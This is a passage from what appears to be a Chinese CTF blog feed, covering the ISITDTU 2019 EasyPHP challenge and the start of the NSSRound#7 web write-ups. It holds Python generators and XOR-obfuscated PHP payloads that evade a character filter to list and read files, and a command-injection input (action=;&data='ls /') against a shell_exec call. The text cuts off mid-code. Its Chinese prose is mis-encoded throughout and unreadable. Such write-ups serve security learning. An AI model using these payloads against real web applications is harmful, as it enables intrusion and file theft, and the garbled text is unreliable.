class="hljs-keyword">import</span> itertools<br><br>final_string = <span class="hljs-string">&quot;print_r(scandir(&#x27;.&#x27;));&quot;</span><br>allowed = <span class="hljs-string">&quot;!#%()*+-/:;&lt;=&gt;?@ABCHIJKLMNQRTUVWXYZ\\]^abchijklmnqrtuvwxyz&#125;~&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hex0</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;0x&#123;:x&#125;&quot;</span>.<span class="hljs-built_in">format</span>(x)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pct_join</span>(<span class="hljs-params">bs</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-string">&quot;%%%02x&quot;</span> % (b &amp; <span class="hljs-number">0xff</span>) <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> bs)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment"># Part 1: exhaustive listing</span><br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> final_string:<br>        oa = <span class="hljs-built_in">ord</span>(a)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> allowed:<br>            oi = <span class="hljs-built_in">ord</span>(i)<br>            <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> allowed:<br>                op = <span class="hljs-built_in">ord</span>(p)<br>                <span class="hljs-keyword">if</span> (oi ^ op) == oa:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;i=<span class="hljs-subst">&#123;hex0(oi)&#125;</span> p=<span class="hljs-subst">&#123;hex0(op)&#125;</span> a=<span class="hljs-subst">&#123;hex0(oa)&#125;</span>&quot;</span>)<br><br>    <span class="hljs-comment"># Part 2: exact payload expression</span><br>    s1 = <span class="hljs-string">&quot;print_r&quot;</span><br>    s2 = <span class="hljs-string">&quot;scandir&quot;</span><br>    dot = <span class="hljs-string">&quot;.&quot;</span><br><br>    I1 = [<span class="hljs-built_in">ord</span>(c) ^ <span class="hljs-number">0xff</span> <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s1]<br>    I2 = [<span class="hljs-built_in">ord</span>(c) ^ <span class="hljs-number">0xff</span> <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s2]<br>    D1 = <span class="hljs-built_in">ord</span>(dot) ^ <span class="hljs-number">0xff</span><br><br>    FF7_pct = <span class="hljs-string">&quot;%ff&quot;</span>*<span class="hljs-number">7</span><br><br>    payload = (<br>        final_string<br>        + <span class="hljs-string">&quot;==&quot;</span><br>        + <span class="hljs-string">f&quot;((<span class="hljs-subst">&#123;pct_join(I1)&#125;</span>)^(<span class="hljs-subst">&#123;FF7_pct&#125;</span>))&quot;</span><br>        + <span class="hljs-string">f&quot;(((<span class="hljs-subst">&#123;pct_join(I2)&#125;</span>)^(<span class="hljs-subst">&#123;FF7_pct&#125;</span>))(%<span class="hljs-subst">&#123;D1:02x&#125;</span>^%ff));&quot;</span><br>    )<br>    <span class="hljs-built_in">print</span>(payload)<br><br>    <span class="hljs-comment"># Optional: verify equals the exact required string</span><br>  <br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br>print_r(scandir(<span class="hljs-string">&#x27;.&#x27;</span>));==((%8f%8d%<span class="hljs-number">96</span>%<span class="hljs-number">91</span>%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%<span class="hljs-number">91</span>%9b%<span class="hljs-number">96</span>%8d)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));<br></code></pre></td></tr></table></figure><p>è§£å†³æ€è·¯æ˜¯åœ¨è¿™16ä¸ªä¸é‡å¤å­—ç¬¦é‡Œåˆ å‡ä¸€äº›ï¼Œåˆ å‡çš„å­—ç¬¦ç”¨å…¶ä»–å­—ç¬¦å¼‚æˆ–æ¥è¡¨ç¤ºã€‚<br>ä¸»è¦æ˜¯å’Œ%ffå¼‚æˆ–çš„é‚£äº›å­—ç¬¦ä¸²ã€‚å…¶ä»–éƒ½æ˜¯å›ºå®šçš„ã€‚</p><p>ç”¨çš„æ˜¯<code>a^b^c=d</code>,æŠŠ<code>a^b^c</code>æ›¿æ¢åŸæ¥çš„dï¼Œå†å’Œ%ffå¼‚æˆ–ã€‚<br>å³åŸæ¥çš„<code>d^%ff = a^b^c^%ff</code>ã€‚</p><p>ç”¨è„šæœ¬ç­›é€‰ä¸€ä¸‹å¯ä»¥è¢«æ›¿æ¢æ‰çš„å­—ç¬¦ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># xor_subs_no_forbidden.py</span><br><span class="hljs-keyword">from</span> itertools import product<br><br>TARGET = <span class="hljs-string">&quot;print_r(scandir(&#x27;.&#x27;));&quot;</span><br><br><span class="hljs-comment"># ä¸å…è®¸ä½œä¸ºâ€œææ–™å­—ç¬¦â€ï¼ˆx/y/zï¼‰å‚ä¸å¼‚æˆ–çš„å­—é¢å­—ç¬¦ï¼š</span><br><span class="hljs-comment"># æ³¨æ„ï¼šè¿™æ˜¯â€œå­—é¢å­—ç¬¦é›†â€çš„é™åˆ¶ï¼Œä¸è¿ç®—ç¬¦ ^ æ— å…³ã€‚</span><br>FORBIDDEN_BASE = <span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&quot;^;().&#x27;_&quot;</span>)     <span class="hljs-comment"># &lt;- ä½ è¦æ±‚çš„ï¼šä¸è¦æŠŠ ^ å’Œ ; ç”¨ä½œææ–™</span><br><br><span class="hljs-comment"># æ˜¯å¦å…è®¸å¼•å…¥é¢å¤–çš„â€œææ–™å­—ç¬¦â€ï¼ˆä¸åœ¨ç›®æ ‡ä¸²ä¸­ï¼‰</span><br>ALLOW_EXTRA_BASE = False<br>EXTRA_BASE = <span class="hljs-string">&quot;&quot;</span>  <span class="hljs-comment"># ä¾‹å¦‚: &quot;_()&#123;&#125;&quot;ï¼›åªæœ‰åœ¨ ALLOW_EXTRA_BASE=True æ—¶æ‰ç”Ÿæ•ˆ</span><br><br>def <span class="hljs-title function_ invoke__">o</span>(c): <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">ord</span>(c)<br><br>def <span class="hljs-title function_ invoke__">find_subs</span>(base_chars, target_chars):<br>    base_codes = [<span class="hljs-title function_ invoke__">o</span>(c) <span class="hljs-keyword">for</span> c in base_chars]<br>    <span class="hljs-comment"># é¢„å»º 2 å…ƒã€3 å…ƒæŸ¥è¡¨ï¼šå€¼-&gt;(x,y, [z])</span><br>    table2 = &#123;&#125;<br>    <span class="hljs-keyword">for</span> x, y in <span class="hljs-title function_ invoke__">product</span>(base_codes, repeat=<span class="hljs-number">2</span>):<br>        table2.<span class="hljs-title function_ invoke__">setdefault</span>(x ^ y, []).<span class="hljs-title function_ invoke__">append</span>((x, y))<br>    table3 = &#123;&#125;<br>    <span class="hljs-keyword">for</span> x, y, z in <span class="hljs-title function_ invoke__">product</span>(base_codes, repeat=<span class="hljs-number">3</span>):<br>        table3.<span class="hljs-title function_ invoke__">setdefault</span>(x ^ y ^ z, []).<span class="hljs-title function_ invoke__">append</span>((x, y, z))<br><br>    subs2, subs3 = &#123;&#125;, &#123;&#125;<br>    <span class="hljs-keyword">for</span> t in target_chars:<br>        ot = <span class="hljs-title function_ invoke__">o</span>(t)<br>        <span class="hljs-keyword">if</span> ot in table2:<br>            subs2[t] = [(<span class="hljs-title function_ invoke__">chr</span>(x), <span class="hljs-title function_ invoke__">chr</span>(y)) <span class="hljs-keyword">for</span> x, y in table2[ot]]<br>        <span class="hljs-keyword">if</span> ot in table3:<br>            subs3[t] = [(<span class="hljs-title function_ invoke__">chr</span>(x), <span class="hljs-title function_ invoke__">chr</span>(y), <span class="hljs-title function_ invoke__">chr</span>(z)) <span class="hljs-keyword">for</span> x, y, z in table3[ot]]<br>    <span class="hljs-keyword">return</span> subs2, subs3<br><br>def <span class="hljs-title function_ invoke__">main</span>():<br>    uniq = <span class="hljs-title function_ invoke__">sorted</span>(<span class="hljs-title function_ invoke__">set</span>(TARGET))<br>    <span class="hljs-keyword">print</span>(f<span class="hljs-string">&quot;[*] target: &#123;TARGET&#125;&quot;</span>)<br>    <span class="hljs-keyword">print</span>(f<span class="hljs-string">&quot;[*] unique chars (&#123;len(uniq)&#125;): &#123;&#x27;&#x27;.join(uniq)&#125;&quot;</span>)<br><br>    <span class="hljs-comment"># åŸºå­—ç¬¦é›†åˆï¼šé»˜è®¤ç”¨ç›®æ ‡ä¸²å·²æœ‰å­—ç¬¦ï¼›å»æ‰ç¦ç”¨å­—é¢å­—ç¬¦</span><br>    base_set = (<span class="hljs-title function_ invoke__">set</span>(uniq) - FORBIDDEN_BASE)<br>    <span class="hljs-keyword">if</span> ALLOW_EXTRA_BASE:<br>        base_set |= <span class="hljs-title function_ invoke__">set</span>(EXTRA_BASE)<br><br>    base = <span class="hljs-title function_ invoke__">sorted</span>(base_set)<br>    <span class="hljs-keyword">print</span>(f<span class="hljs-string">&quot;[*] base (excluded &#123;FORBIDDEN_BASE&#125;): &#123;&#x27;&#x27;.join(base)&#125; (count=&#123;len(base)&#125;)&quot;</span>)<br><br>    <span class="hljs-comment"># æŸ¥æ‰¾ 2 å…ƒ / 3 å…ƒæ›¿ä»£ï¼ˆææ–™éƒ½æ¥è‡ª baseï¼‰</span><br>    subs2, subs3 = <span class="hljs-title function_ invoke__">find_subs</span>(base, uniq)<br><br>    <span class="hljs-comment"># æ‰“å°æ¯ä¸ªç›®æ ‡å­—ç¬¦çš„éƒ¨åˆ†æ›¿ä»£æ–¹æ¡ˆï¼ˆé¿å…è¿‡é•¿ï¼Œè¿™é‡Œå„åˆ—ä¸¾æœ€å¤š 6 æ¡ï¼‰</span><br>    LIM = <span class="hljs-number">6</span><br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;\n== 2-term XOR (t = x ^ y), up to 6 examples ==&quot;</span>)<br>    <span class="hljs-keyword">for</span> t in uniq:<br>        <span class="hljs-keyword">if</span> t in subs2:<br>            ex = <span class="hljs-string">&quot; , &quot;</span>.<span class="hljs-title function_ invoke__">join</span>(f<span class="hljs-string">&quot;&#123;a&#125;^&#123;b&#125;&quot;</span> <span class="hljs-keyword">for</span> a, b in subs2[t][:LIM])<br>            <span class="hljs-keyword">print</span>(f<span class="hljs-string">&quot;  &#123;repr(t)&#125;: &#123;ex&#125;&quot;</span>)<br><br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;\n== 3-term XOR (t = x ^ y ^ z), up to 6 examples ==&quot;</span>)<br>    <span class="hljs-keyword">for</span> t in uniq:<br>        <span class="hljs-keyword">if</span> t in subs3:<br>            ex = <span class="hljs-string">&quot; , &quot;</span>.<span class="hljs-title function_ invoke__">join</span>(f<span class="hljs-string">&quot;&#123;a&#125;^&#123;b&#125;^&#123;c&#125;&quot;</span> <span class="hljs-keyword">for</span> a, b, c in subs3[t][:LIM])<br>            <span class="hljs-keyword">print</span>(f<span class="hljs-string">&quot;  &#123;repr(t)&#125;: &#123;ex&#125;&quot;</span>)<br><br>    <span class="hljs-comment"># å¯ç§»é™¤æ€§ï¼šæŠŠæŸä¸ªå­—ç¬¦ä»â€œå¯ç”¨ææ–™â€é‡Œå‰”é™¤åï¼Œèƒ½å¦ç”±å‰©ä½™ base åˆæˆå®ƒï¼Ÿ</span><br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;\n== Removability check (can t be rebuilt from BASE without using t and forbidden?) ==&quot;</span>)<br>    <span class="hljs-keyword">for</span> t in uniq:<br>        <span class="hljs-comment"># è¿™ä¸ªæ£€æŸ¥çš„è¯­ä¹‰ï¼šæˆ‘ä»¬æƒ³â€œåˆ æ‰ t è¿™ä¸ªå­—é¢å­—ç¬¦â€ï¼Œçœ‹çœ‹è¿˜èƒ½ä¸èƒ½ç”¨å‰©ä½™ base åˆæˆ t</span><br>        reduced_base = <span class="hljs-title function_ invoke__">sorted</span>((<span class="hljs-title function_ invoke__">set</span>(base) - &#123;t&#125;))<br>        s2, s3 = <span class="hljs-title function_ invoke__">find_subs</span>(reduced_base, [t])<br>        ok = (t in s2) <span class="hljs-keyword">or</span> (t in s3)<br>        <span class="hljs-keyword">print</span>(f<span class="hljs-string">&quot;  remove &#123;repr(t)&#125; ?  &#123;&#x27;YES (rebuildable)&#x27; if ok else &#x27;NO&#x27;&#125;&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-title function_ invoke__">main</span>()<br><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ä½¿ç”¨</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cos">a = c<span class="hljs-symbol">^p</span><span class="hljs-symbol">^r</span><br><span class="hljs-keyword">d</span> = <span class="hljs-keyword">s</span><span class="hljs-symbol">^c</span><span class="hljs-symbol">^t</span><br>n = i<span class="hljs-symbol">^s</span><span class="hljs-symbol">^t</span><br></code></pre></td></tr></table></figure><p>æ›¿æ¢æˆ<code>print_r(sca(a = c^p^r).(n = i^s^t).(d = s^c^t).ir(&#39;.&#39;));</code>å†è¿›è¡Œå–åï¼Œæœ€åå¾—å‡ºäº†payloadã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(.));=((%<span class="hljs-number">9</span>b%<span class="hljs-number">9</span>c%<span class="hljs-number">9</span>b%<span class="hljs-number">9</span>b%<span class="hljs-number">9</span>b%<span class="hljs-number">9</span>b%<span class="hljs-number">9</span>c)^(%<span class="hljs-number">9</span>b%<span class="hljs-number">8</span>f%<span class="hljs-number">9</span>b%<span class="hljs-number">9</span>c%<span class="hljs-number">9</span>c%<span class="hljs-number">9</span>b%<span class="hljs-number">8</span>f)^(%<span class="hljs-number">8</span>f%<span class="hljs-number">9</span>e%<span class="hljs-number">96</span>%<span class="hljs-number">96</span>%<span class="hljs-number">8</span>c%a0%<span class="hljs-number">9</span>e)^(%ff%ff%ff%ff%ff%ff%ff))(((%<span class="hljs-number">9</span>b%<span class="hljs-number">9</span>b%<span class="hljs-number">9</span>b%<span class="hljs-number">9</span>b%<span class="hljs-number">9</span>b%<span class="hljs-number">9</span>b%<span class="hljs-number">9</span>c)^(%<span class="hljs-number">9</span>b%<span class="hljs-number">9</span>b%<span class="hljs-number">9</span>b%<span class="hljs-number">9</span>c%a0%<span class="hljs-number">9</span>b%<span class="hljs-number">8</span>f)^(%<span class="hljs-number">8</span>c%<span class="hljs-number">9</span>c%<span class="hljs-number">9</span>e%<span class="hljs-number">96</span>%a0%<span class="hljs-number">96</span>%<span class="hljs-number">9</span>e)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));<br></code></pre></td></tr></table></figure><p>å°†å…¶ä¼ å…¥å¾—åˆ°å½“å‰ç›®å½•çš„æ–‡ä»¶ï¼š</p><blockquote><p>Array ( [0] &#x3D;&gt; . [1] &#x3D;&gt; .. [2] &#x3D;&gt; index.php [3] &#x3D;&gt; n0t_a_flAg_FiLe_dONT_rE4D_7hIs.txt )</p></blockquote><p>è¿™ä¸ªæ–‡ä»¶åå¤ªé•¿äº†ï¼Œç›´æ¥catæˆ‘ä»¬æ›¿æ¢å­—ç¬¦ä¸å¥½æ‰¾ï¼Œå¯ä»¥ç”¨ä¸€äº›å‡½æ•°ç›´æ¥è¯»æ•°ç»„æœ€åä¸€ä½ã€‚</p><p>ä½¿ç”¨end()å¯ä»¥è¿”å›æ•°ç»„çš„æœ€åä¸€é¡¹ï¼š</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251110184305356-1762771388354-1.png" alt="image-20251110184305356"></p><p>æ„é€ <code>readfile(end(scandir(.)))</code>å³å¯ã€‚</p><p>å¯ä»¥è¢«æ›¿ä»£çš„å­—ç¬¦ï¼š</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cos"><span class="hljs-keyword">r</span> = <span class="hljs-keyword">s</span><span class="hljs-symbol">^d</span><span class="hljs-symbol">^e</span><br><br>f = c<span class="hljs-symbol">^l</span><span class="hljs-symbol">^i</span><br><br>n = c<span class="hljs-symbol">^l</span><span class="hljs-symbol">^a</span><br></code></pre></td></tr></table></figure><p>åŒæ ·çš„æ–¹æ³•æ„é€ payload:</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery">show_source(<span class="hljs-keyword">end</span>(scandir(.)));=((<span class="hljs-meta">%8d</span><span class="hljs-meta">%9c</span><span class="hljs-meta">%97</span><span class="hljs-meta">%a0</span><span class="hljs-meta">%88</span><span class="hljs-meta">%8d</span><span class="hljs-meta">%97</span><span class="hljs-meta">%8d</span><span class="hljs-meta">%9c</span><span class="hljs-meta">%a0</span><span class="hljs-meta">%a0</span>)^(<span class="hljs-meta">%9a</span><span class="hljs-meta">%97</span><span class="hljs-meta">%9b</span><span class="hljs-meta">%88</span><span class="hljs-meta">%a0</span><span class="hljs-meta">%9a</span><span class="hljs-meta">%9b</span><span class="hljs-meta">%9b</span><span class="hljs-meta">%8d</span><span class="hljs-meta">%9c</span><span class="hljs-meta">%9a</span>)^(<span class="hljs-meta">%9b</span><span class="hljs-meta">%9c</span><span class="hljs-meta">%9c</span><span class="hljs-meta">%a0</span><span class="hljs-meta">%88</span><span class="hljs-meta">%9b</span><span class="hljs-meta">%9c</span><span class="hljs-meta">%9c</span><span class="hljs-meta">%9c</span><span class="hljs-meta">%a0</span><span class="hljs-meta">%a0</span>)^(<span class="hljs-meta">%ff</span><span class="hljs-meta">%ff</span><span class="hljs-meta">%ff</span><span class="hljs-meta">%ff</span><span class="hljs-meta">%ff</span><span class="hljs-meta">%ff</span><span class="hljs-meta">%ff</span><span class="hljs-meta">%ff</span><span class="hljs-meta">%ff</span><span class="hljs-meta">%ff</span><span class="hljs-meta">%ff</span>))(((<span class="hljs-meta">%a0</span><span class="hljs-meta">%97</span><span class="hljs-meta">%8d</span>)^(<span class="hljs-meta">%9a</span><span class="hljs-meta">%9a</span><span class="hljs-meta">%9b</span>)^(<span class="hljs-meta">%a0</span><span class="hljs-meta">%9c</span><span class="hljs-meta">%8d</span>)^(<span class="hljs-meta">%ff</span><span class="hljs-meta">%ff</span><span class="hljs-meta">%ff</span>))(((<span class="hljs-meta">%8d</span><span class="hljs-meta">%a0</span><span class="hljs-meta">%88</span><span class="hljs-meta">%97</span><span class="hljs-meta">%8d</span><span class="hljs-meta">%9b</span><span class="hljs-meta">%9c</span>)^(<span class="hljs-meta">%9a</span><span class="hljs-meta">%9c</span><span class="hljs-meta">%8d</span><span class="hljs-meta">%9a</span><span class="hljs-meta">%9b</span><span class="hljs-meta">%9a</span><span class="hljs-meta">%8d</span>)^(<span class="hljs-meta">%9b</span><span class="hljs-meta">%a0</span><span class="hljs-meta">%9b</span><span class="hljs-meta">%9c</span><span class="hljs-meta">%8d</span><span class="hljs-meta">%97</span><span class="hljs-meta">%9c</span>)^(<span class="hljs-meta">%ff</span><span class="hljs-meta">%ff</span><span class="hljs-meta">%ff</span><span class="hljs-meta">%ff</span><span class="hljs-meta">%ff</span><span class="hljs-meta">%ff</span><span class="hljs-meta">%ff</span>))(<span class="hljs-meta">%d1</span>^<span class="hljs-meta">%ff</span>)));<br></code></pre></td></tr></table></figure><h3 id="references"><a href="#references" class="headerlink" title="references:"></a>references:</h3><p>[<a href="https://www.shawroot.cc/1209.html">ISITDTU 2019]EasyPHP â€“ ã€Œé…æªæœ±ä¸½å¶ã€‚ã€</a></p><p><a href="https://kinseyy.github.io/2024/07/25/ISITDTU-2019-EasyPHP/">https://kinseyy.github.io/2024/07/25/ISITDTU-2019-EasyPHP/</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>NSSRound#7</title>
    <link href="/2025/11/07/NSSRound-7/"/>
    <url>/2025/11/07/NSSRound-7/</url>
    
    <content type="html"><![CDATA[<h1 id="ã€æ›´æ–°ä¸­ã€‘-NSSRound-7-Team-web"><a href="#ã€æ›´æ–°ä¸­ã€‘-NSSRound-7-Team-web" class="headerlink" title="ã€æ›´æ–°ä¸­ã€‘[NSSRound#7 Team]web"></a>ã€æ›´æ–°ä¸­ã€‘[NSSRound#7 Team]web</h1><h2 id="NSSRound-7-Team-ec-RCE"><a href="#NSSRound-7-Team-ec-RCE" class="headerlink" title="[NSSRound#7 Team]ec_RCE"></a>[NSSRound#7 Team]ec_RCE</h2><p>ç›´æ¥æ‰«æç›®å½•å¾—åˆ°DS_Storeï¼Œè¿›å»ä¼šå‘ç°èƒ½çœ‹åˆ°Ns_SCtF.phpã€‚</p><p>æºç :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span>PHP<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;action&quot;</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;data&quot;</span>]))<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br> <br><span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&#x27;LANG=zh_TW.utf8&#x27;</span>); <br> <br><span class="hljs-variable">$action</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;action&quot;</span>];<br><span class="hljs-variable">$data</span> = <span class="hljs-string">&quot;&#x27;&quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;data&quot;</span>].<span class="hljs-string">&quot;&#x27;&quot;</span>;<br> <br><span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&quot;/var/packages/Java8/target/j2sdk-image/bin/java -jar jar/NCHU.jar <span class="hljs-subst">$action</span> <span class="hljs-subst">$data</span>&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$output</span>;    <br></code></pre></td></tr></table></figure><p><code>action</code>å’Œ<code>data</code>æ˜¯å¯æ§çš„ï¼Œå¹¶ä¸”ä¼šè¢«æ‹¼æ¥åˆ°<code>output</code>ä¸­ç„¶åè¢«æ‰§è¡Œç„¶åè¾“å‡ºã€‚å¯ä»¥RCEã€‚</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">action</span><span class="hljs-operator">=</span><span class="hljs-comment">;&amp;data=&#x27;ls /&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-11-05_14-50-43.png" alt="PixPin_2025-11-05_14-50-43"></p><h2 id="NSSRound-7-Team-0o0"><a href="#NSSRound-7-Team-0o0" class="headerlink" title="[NSSRound#7 Team]0o0"></a>[NSSRound#7 Team]0o0</h2><p>ç›®å½•æ‰«æä¸‹è½½åˆ°æºç æˆ‘ä»¬è¿›è¡Œä¸€ä¸‹ä»£ç å®¡è®¡ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br> <br><span class="hljs-comment">//$NSSCTF = $_GET[&#x27;NSSCTF&#x27;] ?: &#x27;&#x27;;</span><br><span class="hljs-comment">//$NsSCTF = $_GET[&#x27;NsSCTF&#x27;] ?: &#x27;&#x27;;</span><br><span class="hljs-comment">//$NsScTF = $_GET[&#x27;NsScTF&#x27;] ?: &#x27;&#x27;;</span><br><span class="hljs-comment">//$NsScTf = $_GET[&#x27;NsScTf&#x27;] ?: &#x27;&#x27;;</span><br><span class="hljs-variable">$NSScTf</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;NSScTf&#x27;</span>] ?: <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$nSScTF</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nSScTF&#x27;</span>] ?: <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$nSscTF</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nSscTF&#x27;</span>] ?: <span class="hljs-string">&#x27;&#x27;</span>;<br> <br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$NSSCTF</span> != <span class="hljs-variable">$NsSCTF</span> &amp;&amp; <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$NSSCTF</span>) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$NsSCTF</span>)) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$NsScTF</span>) &amp;&amp; <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$NsScTF</span>, <span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>))) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$NsScTf</span>) === <span class="hljs-string">&quot;Welcome to Round7!!!&quot;</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nss_ctfer.vip&#x27;</span>])) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$NSScTf</span> != <span class="hljs-number">114514</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$NSScTf</span>, <span class="hljs-number">0</span>) === <span class="hljs-number">114514</span>) &#123;<br>                    <span class="hljs-variable">$nss</span> = <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$nSScTF</span>) <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$nSscTF</span>) !== <span 